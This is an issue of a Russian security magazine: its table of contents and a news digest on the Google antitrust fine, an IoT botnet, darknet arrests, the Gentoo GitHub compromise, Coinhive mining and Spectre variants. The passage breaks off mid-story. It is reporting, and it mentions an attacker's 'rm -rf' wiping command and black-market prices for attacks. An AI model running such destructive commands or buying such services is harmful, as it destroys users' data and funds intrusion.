
                                               Июль 2018
            № 232
CONTENTS

   MEGANEWS
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

    Опас ный IoT
  Как най ти уязвимые устройства и что меша ет их взло мать

   Смеш ные и страшные вещи
  Вспоминаем самые зрелищ ные взло мы IoT за последние несколько лет

    Пен тест UEFI
  Оце нива ем защищен ность про шивки UEFI с помощью CHIPSEC

    Самое крутое с мировых ИБ‐кон ференций
  Интересные доклады, посвящен ные социальной инженерии

    WTF is APT?
  Прод винутые ата ки, хитрости и методы защиты

    Полностью твой админ
  Эксплуатируем LFI и выпол нение произвольного кода в phpMyAdmin

    Злой дебаг
  Исполь зуем отладчик для исследова ния и взлома приложений для Android

      All in по фану
  Как разобрать, изменить и собрать обратно мобильную игру на Unity

    Удаленное удаление
  Как захватить кон троль над WordPress, заставив его стереть файл

     Android под кол паком
  Как раскрывают кейсы взло ма мобильных устройств

    По цепоч ке уяз вимостей
  Получа ем пол ный кон троль над Gitea с нуля

    Господин Самоунич тожение
  Как в домашних усло виях смастерить Rubber Ducky со встроенной пиротехникой

    MacOS tips’n’tricks
  Полез ные вещи, о которых сто ит знать каждому маководу

    Идеальное фото
  Что такое HDR+ и как активировать его на сво ем смартфоне

   WWW
  Интересные веб‐сервисы

    Задачи на собесе дованиях
  За дания для хар дкор щиков от компании Acronis

    Пишем майнер на Java
  Кодим добыт чик криптовалюты Electroneum

     Угрозы под контролем
  Превращаем Zabbix в сканер безопасности

    Snek Fite
  Как я сделал онлайновую игру для программистов

     Тит ры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ЕС ОШТРАФОВАЛ
GOOGLE
В конце июля 2018 года Еврокомиссия оштра фовала Google на рекор‐
дные 4,34 миллиарда евро (около 5 миллиардов дол ларов) за то, что ком‐
пания злоупотребляет доминирующим положением Android на рынке и меша‐
ет здоровой кон куренции. Претензии регулятора сосредоточились вокруг
трех нарушений антимонопольных пра вил:
 • если производитель желает интегрировать Play Store в свои устрой ства, он
   также обязан (в числе прочего) установить на них приложение Google
   Search и браузер Chrome;
 • компания  Google  платила  неназ ванным  крупным  производите лям
   и мобильным операторам, чтобы те экс клюзивно предустанавливали
   Google Search на свои устройства;
 • компания Google не позволяла производителям, которые хотели исполь‐
   зовать предустановленные приложения Google на своих устройствах, рас‐
   пространять гаджеты на базе дру гих версий Android (форков), помимо
  одобренных Googlе.

В итоге Google дали 90 дней на устранение обнаруженных нарушений,
или родительскому холдингу Alphabet будут грозить еще более серьезные
последствия — штраф сос тавит до 5% от ежедневного общемирового обо‐
рота Alphabet.
   Сундар Пичаи, глава Google, опубликовал в блоге компании официальный
ответ Еврокомиссии. Он заявляет, что Google не ограничивает свободу дей‐
ствий производите лей и с 2007 года рату ет за разнообразие устройств
на рынке. Так, Пичаи подчеркивает, что наряду с Search, Chrome, Play, Maps
и Gmail производите ли вольны устанавливать на свои устройства и кон‐
курирующие приложения. Кроме того, никто не вынуждает их пользоваться
сервисами и приложениями Google, а сами пользователи всегда могут
отключить или удалить определенные приложения, браузеры и поисковые
решения, воспользовавшись вместо них любыми другими. Одним словом,
Пичаи ясно дал понять, что в Google не сог ласны с решением Еврокомиссии,
и сообщил, что компания будет его оспа ривать.
   Если Google все же выполнит усло вия Еврокомиссии, на рынке мобильных
устройств могут произойти немалые перемены. К примеру, аналитики изда‐
ния Business Insider полагают, что из‐за этого со смартфонов могут исчезнуть
поиск Google, Chrome и даже Google Assistant. Кроме того, это может «раз‐
вязать руки» разработчикам крупных форков (например, Fire OS компании
Amazon), которые, вероятно, смо гут получить доступ к Google Play без одоб‐
рения Google и предустановки на свои устройства конкретных при ложе ний
и сервисов.
  Пока все обсуждали возможные пос ледс твия принятого Еврокомиссией
решения, журналисты издания Bloomberg вспомнили о еще одной раз работке
Google — операционной системе Fuchsia, написанной с использованием
языка Dart. О разработке «Фуксии» стало известно еще в 2016 году, хотя
в Google никогда не стремились афишировать ее существование. По данным
Bloomberg, в настоящее время над соз данием новой ОС тру дятся порядка
ста инженеров.
  Ссылаясь на собственные источники внут ри компании, журналисты пишут,
что уже через несколь ко лет Fuchsia может стать пол ноценной заменой An‐
droid, в которой будут учтены и исправлены ошиб ки компании, а возможно,
даже чем‐то большим. Дело в том, что новая ОС ориентирована не только
на мобильные гаджеты, но и на устройства интернета вещей и ноутбуки, а так‐
же голосовое управление. Источники Bloomberg утверждают, что релиз Fuch‐
sia дол жен состояться в ближайшие три года и в компании серьезно рассмат‐
ривают ее как потенциальную замену Android.


18 000 РОУТЕРОВ ВЗЛОМАЛИ ЗА 24 ЧАСА


Специалисты NewSky Security обнаружили появление нового IoT‐ботнета, который скомпро‐
метировал более 18 000 устройств за один день. Аналитики сообщили, что ботнет строится
на эксплуатации давно извес тной уязвимос ти CVE‐2017‐17215, затрагивающей роутеры Huawei
HG532.


К сожалению, многие владельцы уязвимых устройств по‐прежнему не установили патчи. В ито‐
ге  массовое  сканирование  пор тов  37215,  направленное  на  поиск  данного  бага,
началось 18 июля 2017 года, и уже к вечеру этого дня ботнет заразил 18 тысяч устрой ств.





ИЗ ЖИЗНИ ДАРКНЕТА
В этом месяце стало извес тно сра зу о несколь ких крупных разоблачениях
и операциях правоохранителей и ИБ‐специалистов. На «изнанке интернета»
обнаружили желающих продать коммерчес кую спайварь, инструкции к воен‐
ному дрону, а также арестовали несколько десятков продавцов нелегальных
товаров и услуг.


Спайварь за 50 мил лионов дол ларов
В начале июня израильские СМИ сооб щили об арес те бывшего сотрудника
компании NSO Group, который похитил исходные коды легальной коммерчес‐
кой спайвари и попытал ся продать их в даркнете за 50 миллионов долларов.
  Напомню, что NSO Group была основана в 2010 году и с тех пор занима‐
ется разработкой  легальной малвари,  которую, наряду с  эксплоитами
для 0day, продает правитель ствам и спецслужбам по всему миру. Широкую
известность NSO Group получила в 2016–2017 годах, когда специалисты
по информационной безопас ности обнаружили мощ ные шпионские инстру‐
менты Pegasus и Chrysaor, раз работанные компанией и пред назначенные
для iOS и Android.
   Тогда ИБ‐эксперты называли NSO Group не иначе как «торговцами
кибероружием», а компания, которая даже не имеет публичного сайта и ста‐
рается всегда держаться в тени, была вынуж дена выпус тить офи циальное
заявление. Оно гласило, что «миссия NSO — это сделать мир безопас нее,
поставляя  авторизованным  пра вительственным  структурам  технологии,
которые помогают им бороться с преступностью и терроризмом».
  По данным израильских СМИ, сотрудник NSO Group, чье имя не рас кры‐
вается, похитил исходные коды коммерческой спай вари еще в конце апре‐
ля 2018 года. Согласно обвинитель ному заключению, хищению предшество‐
вал серьезный разговор с начальством: подозреваемого, который тогда
занимал должность старшего программиста, собирались уволить, а он
выражал недовольство работой в компании.
  В силу занимаемой должнос ти сотрудник имел доступ к исходным кодам
продуктов NSO Group. И хотя в компании предус мотре ны меры безопас‐
ности, запрещающие сотрудникам подключать внешние накопители к компь‐
ютерам NSO Group, недовольный программист нашел способ обойти эту
защиту. После неприятной беседы с начальством он вернулся на рабочее
место и скопиро вал исходники на внеш ний жесткий диск. Вскоре после этого
его действительно уволили.
   Спустя месяц после этих событий, в начале июня 2018 года, подозрева‐
емый создал ящик на Mail2Tor и, выдавая себя за хакера, взломавшего изра‐
ильскую компанию, попытался продать похищенное в даркнете, запросив
за исходные коды инстру ментов NSO Group 50 миллионов долларов в крип‐
товалютах Monero, Verge и Zcash. По данным СМИ, перед этим бывший сот‐
рудник компании дол го искал в Google возможные способы продажи киберо‐
ружия и потенциальных покупа телей.
  Один  из  таких  потенциальных  покупа телей  действительно  вступил
в переписку с программистом, однако параллельно он уведомил о происхо‐
дящем представителей NSO Group, а те обра тились в правоохранительные
органы. «Покупатель» и далее сотрудни чал с компанией, помогая NSO Group
вычислить вора, и по их прось бе он вытянул из бывшего сотрудника как мож‐
но больше деталей. В результате уже 5 июня 2018 года подоз реваемого
арестовали, а в его квартире провели обыск, во время которого под мат‐
расом был обнаружен жес ткий диск с похищенными исходниками. В их чис ле,
по данным СМИ, были и исходные коды упомянутой спайвари Pegasus.



      «Индус трия ком мерчес кой спайвари абсолютно новая, очень прибыль-
      ная и могущес твенная, но вмес те с этим она нез релая и прак тичес ки
      не регулируется. Здесь не хва тает профес сиональной этики и сущес-
       тву ет  склонность  к  злоупотребле ниям. В  таких  условиях  кра жа
      и незаконная продажа мощ ных техничес ких средств для наблюдения
      рано или поз дно произойдет, что является еще одним примером того,
      почему этой индус трии столь необходим более серьезный нор матив-
     ный контроль», — ком ментирует дирек тор Citizen Lab Рон Дейберт
      (Ron Deibert).


Во енные методич ки за 200 дол ларов
Еще одного «предпринимателя» вычислили специалис ты компании Recorded
Future. Аналитики обнаружили в даркнете документацию ВВС США, которую
выставили на продажу всего за 150–200 долларов.





Среди документов были инструкции по обслужива нию и эксплуатации БПЛА
MQ‐9 Reaper, разведывательно‐ударного дрона, разработанного компанией
General Atomics Aeronautical Systems для использования в ВВС США, ВМС
США и британских ВВС. Также на руках у злоумышленни ка оказались раз‐
личные учебные пособия, в том числе по обра щению с самодельными взрыв‐
ными устройствами и работе с танками M1 ABRAMS.
  Специалисты Recorded Future прит ворились потенциальными покупателя‐
ми и вступили в контакт с продавцом документов строгого уче та (секретной
эта документация все же не была). Якобы желая убедиться в подлинности
бумаг, аналитики стали задавать воп росы о происхождении документов.
Выяснилось, что хакер искал в Shodan определенные модели роуте ров Net‐
gear, которые используют известные по умолчанию пароли для FTP. Об этой
проблеме известно уже давно, на сайте Netgear даже можно найти специаль‐
ную инструкцию, объясня ющую, как поменять FTP‐пароль. Тем не менее спе‐
циалисты отме чают, что в Сети без тру да можно обнаружить около 4000 таких
уязвимых устройств (к примеру, Netgear Nighthawk R7000).
   Ряд таких уязвимых роутеров обна ружился на военных объ ектах. Через них
злоумышленник проник во внутреннюю  сеть, откуда в итоге и похитил
документы. Исходя из рас ска занного хакером и содержимого дампа, иссле‐
дователи пришли к выводу, что укра денные методички и инс трукции, веро‐
ятнее всего, были похищены с офицерского компь юте ра на авиабазе Крич
в Неваде.
  Иронично, но среди укра денных документов ана литики обнаружили сер‐
тификат, выданный жер тве взломщика пос ле про хождения курса Cyber Aware‐
ness  Challenge. Очевидно,  эта киберграмотность не рас пространялась
на пароли для роутеров.
  Эксперты Recorded Future сообщают, что им уда лось установить имя зло‐
умышленника и страну его проживания. В настоящее время эта информация
уже передана в руки правоохранитель ных органов, которым эксперты теперь
помогают в проведении рас следова ния.


      «Тот факт, что хакер‑одиноч ка со сред ним уров нем техничес кой под-
      готов ки все го за нес колько недель сумел обна ружить ряд уяз вимых
      военных объектов и похитить с них важную информа цию, — это тре-
      вожный пример того, на что могут быть способны более решительные
      и организованные груп пиров ки, име ющие луч шую техничес кую под-
      готов ку и финансирова ние», — пишут спе циалис ты.


Под прик рытием в даркне те
Министерство юстиции США объявило о завершении сложной и масштабной
секретной опе рации, в которой принимали учас тие представители следс‐
твенной службы минис терства внутренней безопасности, иммиграционной
и таможенной полиции, почтовой инспекции почты США, секретной службы
США, а также управле ния по борь бе с наркотиками.
  В общей сложности операция длилась более года, и ее главной целью
было выявление в даркнете продавцов запрещенных и нелегальных товаров
в национальном масшта бе.
  Все началось еще в октябре 2016 года, с арес та человека, предлагавшего
услуги по обмену криптовалют на реальные деньги. Его имя не раскры вается.
Так как задержанный сотрудничал со следствием, с его помощью правоох‐
ранители начали «копать» под его клиентов. В конечном счете это привело
к тому, что федеральные агенты почти год про работали под прикрытием:
в январе 2017 года сотрудники следственной службы министерства внут‐
ренней безопасности, совместно с прокура турой Южного окру га штата
Нью‐Йорк, рекламировали свои услуги на раз личных торговых площадках,
предлагая сервис для отмывания денег и вывода крип товалют в фиат.
  За год в даркнете нашлось немало желающих вос пользоваться услугами
федеральных агентов. Пра воохранителям уда лось вычислить десятки продав‐
цов нелегальных товаров, работающих и работавших на таких известных тор‐
говых площадках, как Silk Road, AlphaBay, Hansa, Dream. На данный момент
это привело к возбуждению уже более чем 90 уголовных дел от Нью‐Йорка
до Калифорнии.
  Пока следствие еще продолжается, и специалис ты отдела по уголовной
преступности министерства юстиции, специализирующиеся на отмы вании
денежных средств и мерах по воз вра щению активов, сотрудничают более чем
с 40 представительствами прокура туры по всей стра не и продол жают следс‐
твие в отношении 65 человек. Сооб щается, что эти меры уже при вели к арес‐
ту более чем 35 подозреваемых.



      «Прес тупники, которые считают, что в дар кне те они в безопас ности,
     ошибаются, — ком ментирует замес титель генерального прокурора
    США Род Розенштейн. — Мы способны рас крыть их сети и полны
     решимос ти прив лечь их к ответс твенности. Сегод ня мы арес товали
      более 35 человек, которые подоз рева ются в тор говле нелегальными
      товара ми  в  дар кне те. Мы  изъяли  их  ору жие,  их  нар котики
      и более 23,6 миллиона долларов незаконно нажитых средств».

Суммарно  в  результате  этой  масштаб ной  операции  было  выдано
более 70 ордеров на обыск и уже изъято:
 • огромное количество запрещенных наркотиков, включая 333 бутыли жид‐
   ких синтетических опи одиов, более 100 тысяч таб леток трамадола,
   100 граммов фентанила, свыше 24 килограммов ксанекса, а также окси‐
   кодон, кокаин, ЛСД, марихуана, MDMA и плантация галлюциногенных гри‐
   бов;
 • более 100 единиц огнестрельного ору жия, вклю чая пистолеты, штурмовые
   винтовки и даже один гранатомет;
 • пять транспортных средств, приобретенных на незаконно нажитые средс‐
   тва и/или использовавшихся для прес тупной деятельности;
 • более 3,6 миллиона долларов наличными и золотыми слитками;
 • более 2000 биткой нов и дру гих криптовалют, общая стоимость которых
   превышает 20 миллионов долларов по текущему курсу;
 • 15 прессов для таблеток, использовавшиеся для изготовления нелегаль‐
   ных синтетических опиоидов;
 • устройства для майнинга бит койнов, компьютерное оборудование и ваку‐
  умные упаков щики.


СОЗ ДАТЕЛЬ ETHEREUM КРАЙНЕ РЕЗ КО ВЫСКАЗАЛСЯ
В АДРЕС ЦЕНТРАЛИЗОВАННЫХ КРИПТОВАЛЮТНЫХ БИРЖ
Виталик Бутерин выступил на мероприятии TechCrunch Sessions: Blockchain. Во время рассказа
о том, что Ethereum должен быть максимально децентрализо ван ным, была поднята тема аутен‐
тификации и пример WeChat, который позволяет вос становить утерян ный пароль, выбрав
доверенные контакты из списка друзей.





→«Мне интересны социальные методы вос становления дос тупа и мультиключевые схе мы. Если
все это не сработает, всем нам придется поль зоваться Coinbase, что будет совсем невесело.
А я очень надеюсь, что все централизован ные биржи сгорят в аду»
— Виталик Бутерин





                                     Продолжение статьи →
← Начало статьи





 ВЗЛОМ GENTOO
  Официальные GitHub‐репозитории Gentoo были взломаны неизвес тны ми
  лицами. Хакеры модифицировали содержимое раз мещенных на сервисе
  репозиториев и страниц, в итоге организацию временно заб локировали
  на GitHub, а все хранящиеся там исходные коды были признаны скомпро‐
  метированными до завершения расследования.
     Вскоре после инцидента разработ чики обна родовали детальный отчет
  о происшедшем, где дали ответы на многие вопросы, тревожившие сооб‐
  щество.   Так,   стало   извес тно,   что   ата ка   произошла   в   ночь
  с 28 на 29 июня 2018 года. К счастью, ата ка была «громкой» и ее быс тро
  заметили. Дело в том, что, получив дос туп к GitHub‐аккаунту, злоумышленники
  практически сразу начали мас сово удалять других разработчиков, а к тем
  по почте поступили соот ветству ющие автоматические уве домления. Если бы
  преступники действовали «тише» и не выдали свое присутствие так быстро,
  последствия могли бы быть намного хуже.
    Доступ к учетной записи Gentoo на GitHub неизвес тные получили благода‐
  ря банальной халатности раз работчиков. Официальный отчет гласит, что
   это как раз тот случай, когда раскрытие пароль ной схемы для одного сайта
  облегчило подбор паролей для других ресурсов. Двухфакторную аутен‐
  тификацию  проштрафившийся  администра тор,  по  всей  видимости,
  не использовал, зато теперь это станет обязатель ным условием для всех, кто
  имеет доступ к GitHub‐акка унту Gentoo.
    В общей сложности разработчики потратили на восстановление контроля
  над учетной записью пять дней (инцидент пришелся на выход ные, что
  осложнило дело), но в ито ге аккаунт Gentoo Organization вернулся к законным
  владельцам, а все следы активнос ти взломщиков и их коммиты были удалены.
     Согласно официальным данным, зло умышленники успе ли внед рить вре‐
  доносный контент в следующие репозитории. В скобках указаны отрезки вре‐
  мени, на протяжении которых кло нирование репозитори ев представляло
   угрозу:
   • gentoo/gentoo: (2018‐06‐28 20:38 — 2018‐06‐29 06:58)
   • gentoo/musl: (2018‐06‐28 20:56 — 2018‐06‐29 06:59)
   • gentoo/systemd: (2018‐06‐28 21:07 — 2018‐06‐29 06:57)

  Сообщается, что взломщики пытались добавить к некоторым репозитори ям ‐
   rm‐rf в попытке стереть все файлы пользователей, но разработчики пишут,
   что это вряд ли сработало бы бла года ря защитным механизмам.
     К отче ту об инциденте также прилагается перечень мер, которые теперь
  предпринимают и собира ются предпринять разработчики. О том, что теперь
   всех обяжут исполь зовать двухфакторную аутентификацию, уже было сказано
  выше. Помимо этого, про водят ся всевозможные ауди ты, раз рабатывается
  официальный план коммуника ций для подоб ных ситуаций, а также офи циаль‐
  ная парольная политика. Кроме того, в ходе инцидента было обнаружено, что
  репозиторий systemd хранился на GitHub нап рямую и не был зеркалом git.‐
   gentoo.org, что также пла ниру ется исправить.
     Разработчики  заверили,  что  собственная  инфраструктура  Gentoo
   в результате атаки не пос традала (gentoo.org и загруженный оттуда софт чис‐
   ты). Таким образом, пользователи, не загружавшие ничего с GitHub, который
  фактически служит лишь зеркалом проекта, находятся в безопасности.


 РЫНОК ПРЕСТУПНЫХ КИБЕРУСЛУГ
  →Специалисты Positive Technologies изучили черный рынок хакерских услуг и постарались оце‐
   нить, нужен ли вообще киберпреступнику широкий спектр специализиро ван ных знаний,
   или для реализации атаки дос таточно обратиться к представите лям теневого рынка (взлом‐
   щикам сайтов и сер веров, разработчикам и распространите лям вредонос ного ПО, владельцам
   ботнетов и другим).





  В первом квартале 2018 года было выявлено на 32% больше серьезных киберинцидентов, чем
   в первом квартале 2017 года.

   Специалисты изучили 25 наиболее популяр ных англоязычных и русско язычных теневых тор‐
   говых площадок, проанализи ровав более 10 000 объявлений.





                   Доли объявлений о продаже малвари разных типов


   Стоимость целевой атаки на организацию, в зависимос ти от слож ности, может сос тавлять
   от 4500 долларов, включая наем специалиста по взлому, аренду инфраструктуры и покупку
   соответствующих инструментов.


   Взлом  сайта  с  получением  пол ного  контроля  над  веб‐приложением  обойдет ся  всего
   в 150 долларов.

   Исследователям встречались объявления с запросами на целевой взлом сайтов, где оценка
   работы доходила до 1000 долларов.

   Цены на ПО для создания ботнета начинаются от 200 долларов. Полный комплект, вклю‐
   чающий ПО для командного сервера, ПО для создания троянов, настроенных на работу с опре‐
   деленным билдером, и допол нитель ные модули для трояна, может стоить 1000–1500 дол-
  ларов.

   Самый дорогой класс готовой малвари — вредоносы для бан коматов, цены на такое ПО начина‐
   ются от 1500 долларов.

   Меньше чем за 1 доллар можно отправить пись мо с необходимым текстом и вложен ным фай‐
   лом сразу на 1000 случайных email‐адресов.


   Услуги взлома почтовых ящиков и учетных записей в популярных социальных сетях стоят
   от 40 долларов.





                Соотношение спроса и предложения услуг на черном рынке





 COINHIVE НА НОВЫЙ
 ЛАД
  Специалисты компаний Malwarebytes и Sucuri обнаружили новую майнерскую
  кампанию. Преступники используют старый трюк на новый лад: при помощи
  коротких ссылок маскируют не просто вредоносные сайты, а скрытые май‐
  неры.





                             Схема атаки

  Первыми проблему заметили аналитики Sucuri, еще в конце мая 2018 года
  посвятив ей отдельную запись в блоге компании. Дело в том, что популярный
  сервис для браузерного майнин га Coinhive предлага ет своим клиентам услугу
  сокращения URL (cnhv.co). Принцип работы данного сервиса очень прост.
  Вот как описывают его сами операторы Coinhive:



         «Если у вас есть ссылка, по которой вы хотели бы пере адре совать
         пользовате ля, с помощью cnhv.co вы можете соз дать ее сок ращенную
        вер сию. Пользовате лю придется выс читать опре деленное количес тво
        хешей (которое зада ете вы), а затем он будет автоматичес ки нап-
         равлен на целевой URL».

  Именно этот сервис теперь и эксплуатируют преступники. Исследователи
   Malwarebytes предупреждают, что мно жес тво легитимных сайтов, работа‐
  ющих под управлением самых разных CMS, были скомпрометированы.
  Обфусцированный код, внедренный на такие сайты, использует короткие
  ссылки Coinhive для скрытого drive‐by‐майнин га.
     Таким образом преступники избегают прямого внед рения майнингового
   JavaScript на взломанные сайты, вместо этого они обфусцируют код, который
  занимается динамическим внедрением «невидимых» iframe (пиксель на пик‐
   сель) на страницы, загружающиеся в бра узерах пользователей. Короткие
  ссылки cnhv.co заставляют устройства пос тра давших добывать криптовалюту
  на протяжении определенного промежут ка времени, после чего происходит
  переадресация по оригинальному адресу, который сократили столь хитрым
  способом.





         «Конеч но, по умолчанию  Coinhive  уста нав лива ет „задер жку“ лишь
         на 1024 хеша, но, нап ример, одна из изу ченных нами ссы лок тре бова-
         ла 3 712 000 хешей перед загрузкой целевого URL», — рас ска зыва ют
         спе циалис ты Malwarebytes.

   Хуже того, когда нужное число хешей достигнуто, пользователь переходит
  по оригинальной ссылке, которую сократили с помощью cnhv.co. Но этот ори‐
   гинальный адрес вновь переадресует жер тву на ту же страницу, то есть май‐
   нинг начинается заново. Пользователь при этом вряд ли заметит что‐то
  странное, ведь с его точки зрения страница попросту обновится.
    По данным экспертов, помимо майнеров, таким способом рас простра‐
  няют и ссылки на вредонос ные или взломанные сайты, где посетителей
  обманом вынуждают загрузить и установить майнинговую мал варь для дес‐
   ктопных устройств. Чаще всего такие вредоносы мас кируются под различное
  легитимное ПО и файлы. К примеру, преступники распространяют майнер
  XMRig под видом файлов, которые пользователи искали в онлайне (дело
   в  том,  что  стараниями  зло умышленников скомпрометированные сайты
  попадают в поисковую выдачу Google и Bing).


  TWITTER ЗАБЛОКИРОВАЛ 143 000 ПРИЛОЖЕНИЙ


   Представители Twitter заявили, что с апре ля по июнь 2018 года компания отозвала доступ
   к своей платформе для разработчиков более 143 000 приложений. В компании сооб щили, что
   все эти приложения так или иначе нарушали правила пользования API и в Twitter не намере ны
   терпеть спам‐рассылки, втор жение в частную жизнь пользователей и попыт ки ими манипу лиро‐
   вать.


   Теперь разработчикам не только станет сложнее получить дос туп к API, но и придется иметь
   дело с новыми лимита ми: 300 твитов и ретвитов на три часа, 1000 лайков и 15 000 личных
   сообщений в сутки.





                                        Продолжение статьи →
← Начало статьи





 НОВЫЕ SIDE‐CHAN‐
 NEL‐АТАКИ
  К сожалению, известия о все новых ата ках по стороннему каналу и новых
  вариантах эксплуатации проб лем Meltdown и Spectre становятся нашей «пос‐
   тоянной рубрикой». Июль 2018 года не обошел ся без выявления све жих
  проблем в этой области.


  Браузе ры не защищены от Spectre
  Специалисты компании Aleph Security утверждают, что защитные механизмы
  некоторых сов ременных бра узеров, призванные обезопасить пользователей
   от проблемы Spectre, мож но обойти.
      Proof‐of‐concept экс пло иты специалистов сумели обмануть защиту бра‐
   узеров Edge, Chrome и  Safari, а затем, эксплу атируя ори гинальную уяз‐
  вимость Spectre (CVE‐2017‐5753, она же вариант 1), извлечь через браузеры
  пользовательские данные. Так как инженеры Mozilla реализовали свою вер‐
  сию защиты иначе, тот же трюк не удалось повторить с браузером Firefox.
  Исходные коды экспло итов уже опуб ликованы на GitHub.
     Нужно отметить, что при всем мно гооб разии вари аций Meltdown и Spectre
  речь об эксплуатации через бра узеры шла лишь отно сительно самых первых
  версий уязвимостей. Защиту от таких атак реализовали еще в январе текуще‐
   го года, вскоре после того, как о «процес сорных» багах стало извес тно всему
   миру. Так, различные варианты защиты были представлены для  Firefox,
  Chrome, Chromium, V8, WebKit (Safari), а также Edge и IE.
     «Заплатки» и прин цип их работы разнятся от продукта к продукту. Так, раз‐
  работчики применяли отключение SharedArrayBuﬀer, изоляцию сай тов (в бра‐
   узерах на базе Chromium), снизили точность таймеров performance.now(),
  добавили больший разброс зна чений для performance.now().
    Иссле дователи Aleph Security пишут, что им уда лось обойти практически
  все эти средства защиты и извлечь данные из памяти уязвимой машины
  на скорости примерно 1 бит в секунду. Напомню, что эксплу атация Spectre,
  вариант 1, как правило, позволяет извлечь информацию, которой делятся
  между собой различные страницы и процессы браузера. Это могут быть куки
   HttpOnly, куки из других источников, сохраненные пароли и так далее.
     Хотя в итоге скорость атаки оказалась невелика, эксперты объ ясняют, что
  они создавали свои экспло иты не для реальных атак, а чтобы помочь раз‐
  работчикам браузеров подготовить более надежные патчи. Так, исследова‐
   тели подчеркивают, что полученные ими резуль таты демонстри руют неэф‐
  фективность timing‐защиты, которая лишь снижает скорость атак на Spectre,
  но не пре дотвращает их. Более надежными способами защиты оказались
   техника index masking, предполага ющая соз дание маски для мас сива данных,
  а также полная изоляция сайтов.


  Но вые век торы атак
  Специалист МТИ Владимир Кирианский и основатель компании Carl Wald‐
   spurger Consulting Карл Валдспургер (Carl Waldspurger) представили доклад
  о новых векторах атак на оригинальную уязвимость Spectre, вариант 1 (CVE‐
   2017‐5753).
    Обнаруженные проб лемы получили идентифика торы Spectre 1.1 (CVE‐
   2018‐3693) и Spectre 1.2. Равно как и дру гие варианты уязвимостей Meltdown
  и Spectre, два новых бага также используют в работе особенности архи тектур
  современных процессоров, которые прибегают к внеочередным (out‐of‐or‐
   der) и одновре менно упреждающим (или спекулятивным —  speculative)
  механизмам исполнения инс трукций.
    Наиболее опасна из двух новых проблем Spectre 1.1. Согласно данным
  специалистов, баг очень похож на Spectre, вариант 1 и 4: он позволя ет осу‐
  ществить bounds check bypass. В данном случае это Bounds Check Bypass
   Store (BCBS) — обход проверки гра ниц хранилища. Проблема способна
  спровоцировать переполнение speculative‐буфера, что может быть исполь‐
  зовано  атакующим  для внедрения и исполнения произвольного  кода,
  который позволит извлечь данные из ранее защищенных областей памяти
   (включая пароли, криптогра фические ключи и так далее).



         «Воз можность исполне ния произвольных  speculative-записей  несет
         с собой новые и  очень большие рис ки, вклю чая  спе кулятив ное
        исполне ние произвольного кода. Это поз волит ата кующим обойти
        соф твер ные механиз мы, ранее рекомендованные производите лями
         для защиты от спе кулятив ных атак», — пишут иссле дова тели и под-
         черки вают,   что   в   нас тоящее   вре мя   обна ружить   Spectre
          1.1 или защититься от такой ата ки поп росту невоз можно.

  В свою очередь, проб лема Spectre 1.2 поз воляет перезаписы вать указате ли
  и данные в тех областях памяти CPU, которые в нормальных условиях
  защищены PTE‐флагами read‐only (включая vtables, GOT/IAT и так далее).
  В результате все это может помочь обойти защиту песочниц.
     К счастью, для работы Spectre 1.1 и 1.2 по‐прежнему тре буется, чтобы
  злоумышленник уже присутствовал в системе и скомпрометировал ее
   заранее, получив необ ходимые привилегии.
     Представите ли Intel и ARM уже опуб ликова ли техническую документацию,
  посвященную новым проб лемам. Microsoft обновила бюл летень безопас‐
   ности, посвященный Spectre и Meltdown, добавив в него информацию о CVE‐
   2018‐3693. Кроме того, сообщается, что инженеры Oracle и Red Hat уже изу‐
  чают возможные риски для сво их продуктов и пос тараются разработать соф‐
  тверные защитные механизмы. В Oracle уверены, что в будущем ИБ‐спе‐
  циалисты продолжат находить все новые вариации Meltdown и Spectre.
     За обнаружение новых «про цес сорных» проблем Владимир Кирианский
  и Карл Валдспургер получили 100 тысяч долларов от компании Intel в рамках
  bug  bounty  программы  производителя,  работающей  на  платформе
  HackerOne. Напомню, что bug bounty программа компании стала дос тупна
  публично лишь после обнаружения Meltdown и Spectre в начале 2018 года.


  SpectreRSB
  По всей видимости, раз работчики Oracle были абсолютно правы. Эксперты
  из Калифорнийского университета в Ривер сайде опубликовали информацию
  о еще одной side‐channel‐ата ке, получившей имя SpectreRSB. Данный вектор
   эксплуатации тоже связан с механизмами спекуля тивного исполнения инс‐
   трукций.
     От рассматриваемых ранее атак SpectreRSB отличается тем, что он извле‐
   кает данные, атакуя дру гой компонент CPU — Return Stack Buﬀer. Так, другие
   эксплоиты строились на атаках против кеша CPU и Directional branch predictor
  (предсказатель  направленного  ответвления,  процесс,  определяющий
  порядок выполнения спекулятивных операций). В своем докладе исследова‐
   тели пишут, что нашли способ «загрязнить» код RSB таким образом, чтобы
   получить возможность контролировать адрес возврата, «отравив» работу
  механизма спекулятив ного исполнения инс трукций.
     Эксперты описывают три возможные атаки с использовани ем SpectreRSB,
  позволяющие злоумышленнику получить доступ  к данным, которые  тот
  не должен видеть. Так, две ата ки дают возможность извлечь данные из при‐
  ложений, работающих на том же CPU, а третья провоцирует ошибку спекуля‐
   тивных вычислений, из‐за чего под угрозой оказыва ются данные за предела‐
  ми Intel SGX (Software Guard Extensions).
    Специалисты тестировали уязвимость лишь на процес сорах Intel, однако
  они подчеркивают, что решения AMD и ARM используют RSB аналогичным
  образом,  а  значит,  они,  вероятно,  также  уязвимы  перед проблемой
  SpectreRSB.
     Хуже того, специалис ты предупреждают, что большинство выпущенных
  ранее патчей и даже защитная практика Retpoline, разработанная инженера‐
  ми компании Google, бес полезны против SpectreRSB. Так, по словам иссле‐
  дователей, обновле ние, мешающее экс плуатации SpectreRSB, существует
  для процессоров Core i7 Skylake и дру гих новых CPU (но не Intel Xeon), и, хотя
   патч предотвращает использование уязвимости, он предназначался для дру‐
  гой проблемы в работе RSB.
     Представите ли Intel, в свою очередь, сообщили, что эксплуатация Spectr‐
  eRSB  связана  с  проблемой  Branch  Target  Injection  (CVE‐2017‐5715)
  и защититься от таких атак возможно ранее опи санным способом. Разработ‐
   чики AMD и ARM пока никак не проком ментировали раскрытие информации
  о SpectreRSB.


  ПАТРИК ВОРДЛ ОБЛИЧИЛ КИТАЙСКУЮ ЦЕНЗУРУ ТАЙВАНЯ
   Известный ИБ‐эксперт и основатель компании Digital Security Патрик Вордл (Patrick Wardle)
   обнаружил, что на протяжении нескольких лет у китайских пользователей iOS при каждом упо‐
   минании Тайваня крашились приложения (даже если речь идет о прос том эмодзи с флагом
   страны). Дело в том, что КНР не признает государственный суверенитет Тайваня. Эксперт
   пояснил в своем блоге, что эмодзи и упоминания Тайваня должны были прос то вымары ваться
